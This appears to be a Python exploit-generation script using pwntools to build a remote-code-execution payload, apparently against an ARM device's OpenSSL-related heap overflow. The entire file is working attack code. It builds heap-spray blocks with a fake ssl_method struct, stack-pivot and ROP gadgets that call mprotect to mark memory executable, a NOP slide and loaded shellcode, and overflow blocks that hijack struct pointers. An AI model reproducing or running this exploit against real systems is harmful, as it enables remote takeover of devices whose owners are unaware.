# -*- coding: UTF-8 -*-
"""
This code for generateing Echo Rce Payload
"""
from pwn import *
from genshellcode import ShellCodeGen
import conf

DEBUG = False

PROT_READ = 0x01
PROT_WRITE = 0x02
PROT_EXEC = 0x04
PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC


pad_index = 0
def pad(size, base_val = None):
        global pad_index

        if size % 4 != 0:
            raise Exception('Padding must be aligned to 4')
            size += 4 - (size % 4)
            print >> sys.stderr, 'Warning: padding must be aligned to 4, padding %u...' % size
            
        if base_val is None:
            base_val = pad_index
            pad_index += size // 4

        if not DEBUG:
            return '\x00' * size

        padding = ''
        index = 0
        while len(padding) < size:
            padding += p32(base_val + index)
            index += 1
            
        return padding


class EchoRce(object):
    def __init__(self, shellcode, param1, param2, param3, shellcode_thumb=0, libc_base=0xf76cd000, libcrypto_base=0xf750c000):
        self.shellcode = shellcode
        self.param1 = param1
        self.param2 = param2
        self.param3 = param3
        self.shellcode_thumb = shellcode_thumb
        self.libc_base = libc_base
        self.libcrypto_base = libcrypto_base
        self.config = conf.ROP_CONFIG
        self.gadgets = self.config['gadgets']
        self.spray_payload = ""
        self.overflow_payload = ""
        self.init_gadgets()

    def init_gadgets(self):
        self.gadgets['stack_pivot'] = self.libcrypto_base + self.gadgets['stack_pivot']
        self.gadgets['pop_pc'] = self.libc_base + self.gadgets['pop_pc']
        self.gadgets['pop_r0_r1_r2_pc'] = self.libc_base + self.gadgets['pop_r0_r1_r2_pc']
        self.gadgets['mprotect'] = self.libc_base + self.gadgets['mprotect']
        self.gadgets['pop_r4_lr_bx_lr'] = self.libc_base + self.gadgets['pop_r4_lr_bx_lr']

    def heap_spray(self):
        heap_spray_payload = self.spray_payload * self.config['spray_count']
        print 'Total Heap Spray : %u bytes\n' % (len(heap_spray_payload))
        return heap_spray_payload

    def heap_overflow(self):
        heap_overflow_payload = self.overflow_payload * self.config['overflow_count']
        print 'Total Overflow Payload : %u bytes\n' % (len(heap_overflow_payload))
        return heap_overflow_payload

    def heap_debug_overflow(self):
        heap_overflow_payload = self.overflow_payload * self.config['debug_overflow_size']
        print 'Total Overflow Payload : %u bytes\n' % (len(heap_overflow_payload))
        return heap_overflow_payload

    def gen_spray_payload(self):
        size = self.config['spray_size']

        shellcode_address = self.config['shellcode_address']
        if self.shellcode_thumb:
             shellcode_address |= 1

        # Pass mmap aligned address
        spray_page_addess = (self.config['spray_address'] // conf.PAGE_SIZE) * conf.PAGE_SIZE
        spray_page_size = (size // conf.PAGE_SIZE) * conf.PAGE_SIZE
        rop_slide_address = self.config['spray_address'] + self.config['rop_slide_offset']
        stack_pivot = p32(self.gadgets['stack_pivot']) 

        spray_payload = ''
        													     # Fake ssl_method struct 											    
        spray_payload += stack_pivot * 0x0a                    # stack pivot * 0xa 

        spray_payload += p32(0x44444444)                      # r4
        spray_payload += p32(self.gadgets['pop_pc'])             # lr=pop_pc
        spray_payload += p32(self.gadgets['pop_r0_r1_r2_pc'])    # pc = pop_r0_r1_r2_pc
        
        # mprotect(shellcode_address, size, rwx)
        spray_payload += p32(spray_page_addess)                   #  r0 = shellcode address aligned
        spray_payload += p32(spray_page_size)                     #  r1 = size
        spray_payload += p32(PROT_RWX)                            #  r2 = protection
        spray_payload += p32(self.gadgets['mprotect'])            #  pc = mprotect

        # shellcode(param1, param2, param3) 
        spray_payload += p32(self.gadgets['pop_r0_r1_r2_pc'])     #  pop {r0, r1, r2, pc}
        spray_payload += p32(self.param1)                         #  r0 = param1
        spray_payload += p32(self.param2)                         #  r1 = param2
        spray_payload += p32(self.param3)                         #  r2 = param3
        spray_payload += p32(shellcode_address)                   #  pc = shellcode addr 0xee700000
        													                        
        nop = p32(0xbf00bf00)                                     # nop-slide thumb

        print "spray_payload len = %x\n" % len(spray_payload)
        while len(spray_payload) < self.config['shellcode_offset']:
        	spray_payload += nop                                 

        spray_payload += self.shellcode                           # shellcode


        ###############

        if len(spray_payload) > size:
        	print 'Warning: shellcode size is bigger than %u bytes' % (block_size - (len(spray_payload) - len(shellcode)))

        print 'ROP + Slide + Shellcode: %u bytes' % len(spray_payload)
        pad_len = size - len(spray_payload)
        spray_payload += pad(pad_len)

        print 'Spray Unit (Contain Pad): %u bytes\n' % len(spray_payload)
        #print spray_payload.encode('hex')
        self.spray_payload = spray_payload
        #print self.spray_payload.encode("hex")


    def gen_overflow_payload(self):
        size = self.config['overflow_size']
        # spray_address is ssl_method_struct_ptr
        spray_address = self.config['spray_address']
        rop_slide_address = self.config['spray_address'] + self.config['rop_slide_offset']

        # ssl_st struct
        # | version | type | ssl_method_ptr | r3 | r4 | ... | sp | lr | pc |
        overflow_payload = p32(0x46464646)      # r1
        overflow_payload += p32(0x48484848)      # r7
        overflow_payload += p32(spray_address)      # ssl_method_struct_address pointer
        overflow_payload += p32(rop_slide_address)                       # sp = rop_slide_address
        overflow_payload += p32(self.gadgets['pop_r4_lr_bx_lr'])          # pc = pop_r4_lr_bx_lr
        overflow_payload += p32(0x42424242)

        print 'Fake SSL + R0_Stack: %u bytes' % len(overflow_payload)
        pad_len = size - len(overflow_payload)
        overflow_payload += pad(pad_len)

        print 'Overflow Unit (Contain Pad): %u bytes\n' % len(overflow_payload)

        self.overflow_payload = overflow_payload

    def get_overflow_payload(self):
        return self.overflow_payload

    def get_spray_payload (self):
        return self.spray_payload

# Main entry to gen echo rce payload
def gen_echo_rce_payload(libc_base, libcrypto_base, debug_flag = False):

    print '------------------[0] Load ShellCode ------------------\n'
    print 'gadgets libc_base=0x%x,libcrypto_base=0x%x\n' % (libc_base, libcrypto_base)
    
    shellcode_gen = ShellCodeGen(shellcode_path='shellcode.bin')
    shellcode = shellcode_gen.load_shellcode()
    echo_rce = EchoRce(shellcode, 0, 0, 0, 0, libc_base, libcrypto_base)

    print '------------------[1] Gen Spray Payload Unit------------------\n'
    echo_rce.gen_spray_payload()

    print '------------------[2] Gen Overflow Payload Unit------------------\n'
    echo_rce.gen_overflow_payload()

    print '------------------[3] Gen Total Spray Payload------------------\n'
    final_spray_payload = echo_rce.heap_spray()
    
    print '------------------[4] Gen Total Overflow Payload------------------\n'
    if debug_flag == True:
        print 'Gen debug overflow_payload, just 2 structs'
        final_overflow_payload = echo_rce.heap_debug_overflow()
    else:
        final_overflow_payload = echo_rce.heap_overflow()

    return final_spray_payload, final_overflow_payload


if __name__ == '__main__':
    #gen_echo_rce_payload(libc_base=0xf76cd000, libcrypto_base=0xf750c000, debug_flag=True)
    gen_echo_rce_payload(libc_base=0xf76cd000, libcrypto_base=0xf750c000)

